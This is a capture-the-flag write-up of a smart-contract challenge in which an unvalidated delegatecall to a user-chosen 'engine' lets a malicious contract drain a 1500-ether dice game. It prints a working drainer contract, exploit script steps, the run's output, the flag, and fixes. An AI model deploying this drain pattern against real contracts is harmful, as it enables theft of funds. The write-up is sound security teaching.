# Dicey — THEM?!CTF 2026 (Web3 / Smart Contract)

**Category:** Blockchain / Solidity
**Flag:** `THEM?!CTF{pr0vably_fa1r_d1cey_g4m3}`
**Vulnerability:** Attacker-controlled `delegatecall` into an untrusted "engine" contract.

---

## 1. Challenge overview

The challenge is a "provably fair" on-chain dice game. The deployer (`Setup`)
spins up a `Dicey` contract and funds it with **1500 ether**:

```solidity
contract Setup {
    Dicey public immutable dice;
    FairRollEngine public immutable engine;
    address public immutable player;

    constructor(address _player) payable {
        player = _player;
        engine = new FairRollEngine();
        dice = new Dicey{value: 1500 ether}();
    }

    function isSolved() external view returns (bool) {
        return player.balance >= 1_337 ether;   // <-- win condition
    }
}
```

We win by getting our **player EOA balance to ≥ 1337 ether**. The player starts
with ~64 ETH, so we need to extract money from somewhere. The only contract
holding a big pile is `Dicey` (1500 ETH). The goal is therefore: **drain Dicey
into our own account.**

---

## 2. The vulnerable contract

The interesting function is `rollDice`:

```solidity
function rollDice(uint16 rollOver) external payable {
    require(msg.value > 0 && msg.value <= 10 ether, "bad wager");

    Game storage game = games[msg.sender];
    require(game.rollsLeft > 0, "no game");

    // *** the bug ***
    (bool ok,) = game.engine.delegatecall(
        abi.encodeWithSignature("beforeRoll(uint32)", game.nonce)
    );
    require(ok, "engine failed");

    uint256 roll = getRoll(game.serverSeed, game.clientSeed, game.nonce);
    ...
}
```

Before computing the roll, `Dicey` performs a **`delegatecall`** into
`game.engine` — and `game.engine` is fully attacker-controlled:

```solidity
function startGame(address engine, bytes32 clientSeed) external {
    require(engine.code.length > 0, "engine required");   // only checks it's a contract
    ...
    games[msg.sender] = Game({ ..., engine: engine, ..., rollsLeft: 32 });
}
```

The only validation is `engine.code.length > 0` — i.e. "is this an address with
code". There is **no allowlist, no check that it equals the legitimate
`FairRollEngine`**. We can point `engine` at anything we deploy.

### Why `delegatecall` is fatal here

`delegatecall` executes the target contract's **code** but in the **caller's
storage / balance / context**. So when `Dicey` does
`game.engine.delegatecall(...)`:

- `address(this)` inside our engine code **is `Dicey`** (the contract holding
  1500 ETH).
- `address(this).balance` is **Dicey's** balance.
- A `.call{value: ...}` we issue spends **Dicey's** ether.

So our malicious `beforeRoll` can simply sweep the entire Dicey balance out to
us. The whole dice / seed / payout machinery (`serverSeed`, `clientSeed`,
`getRoll`, `quotePayout`, `credits`, `withdraw`) is a **red herring** — we never
need to win a single roll or understand the RNG. We just need the
`delegatecall` to fire once.

---

## 3. The exploit contract

`Evil.sol` — our malicious "engine":

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Evil {
    address payable immutable recipient;

    constructor(address payable _r) {
        recipient = _r;
    }

    function beforeRoll(uint32) external payable {
        (bool ok, ) = recipient.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
```

Key detail: `recipient` is stored as an **`immutable`**. Immutables are baked
into the contract's deployed **bytecode**, not in storage slots. This matters
because under `delegatecall` we run in **Dicey's storage**, so any normal storage
variable would read Dicey's slots (garbage / wrong). An immutable lives in the
code itself, so `recipient` correctly resolves to our player address even while
executing in Dicey's context.

When `Dicey.rollDice` delegatecalls `beforeRoll`:
- `address(this).balance` == Dicey's 1500 ETH
- `recipient` == our player EOA
- `recipient.call{value: balance}("")` ships all of it to us.

---

## 4. Exploit chain

Full script: `exploit.py` (web3.py + py-solc-x, solc 0.8.26).

1. **Launch instance** → `POST /new` (with solved PoW) returns RPC URL,
   player private key, `setupAddress`, `challengeAddress` (the `Dicey` contract).
2. **Deploy `Evil(recipient = player)`**.
3. **`startGame(evil, seed)`** — registers our `Evil` contract as the game engine.
   (`clientSeed` is irrelevant, we pass 32 zero bytes.)
4. **`rollDice(500)` with `value = 1` wei** — passes the `msg.value > 0` check and
   triggers `game.engine.delegatecall("beforeRoll(uint32)")`, which runs our sweep
   and drains Dicey's full balance to the player.
5. **Check `Setup.isSolved()`** → `true`.

Core of the script:

```python
# 2) register Evil as the engine
send(dicey.functions.startGame(evil_addr, b"\x00"*32).build_transaction(...))

# 3) one roll triggers the delegatecall -> sweep
send(dicey.functions.rollDice(500).build_transaction({"value": 1, ...}))

# 4) verify
print("isSolved ->", setup.functions.isSolved().call())
```

---

## 5. Result

```
player bal(before) ~64 ETH      dicey bal 1500 ETH
... deploy Evil ...
... startGame(evil) ...
... rollDice(500) -> delegatecall drain ...
player bal(after) ~4063 ETH     dicey bal 0 ETH
isSolved -> True
```

Player balance jumped from ~64 ETH to ~4063 ETH (well over the 1337 threshold),
Dicey was emptied to 0. Then `GET /<uid>/flag` returned:

```
THEM?!CTF{pr0vably_fa1r_d1cey_g4m3}
```

---

## 6. Root cause & fix

**Root cause:** Using `delegatecall` to invoke an externally supplied,
unvalidated address. `delegatecall` grants the target full control over the
caller's storage and funds — it must *only* ever target trusted, fixed code.

**Fixes:**
- Don't `delegatecall` into user-supplied engines at all. If a hook is needed,
  use a plain `call` (runs in the engine's own context, can't touch Dicey's
  balance or storage), or hardcode the legitimate `FairRollEngine` address.
- If a pluggable engine is truly required, restrict it to an allowlist of
  audited implementations rather than `engine.code.length > 0`.
- General principle: `engine.code.length > 0` proves *only* that an address has
  code — it says nothing about *what* that code does.

---

## Files

- `Dicey.sol` — challenge contract (vulnerable `rollDice` delegatecall)
- `Setup.sol` — deployer + `isSolved()` win condition
- `Evil.sol` — malicious engine that sweeps Dicey's balance
- `exploit.py` — launch + deploy + drain + verify
- `creds.json` — instance credentials
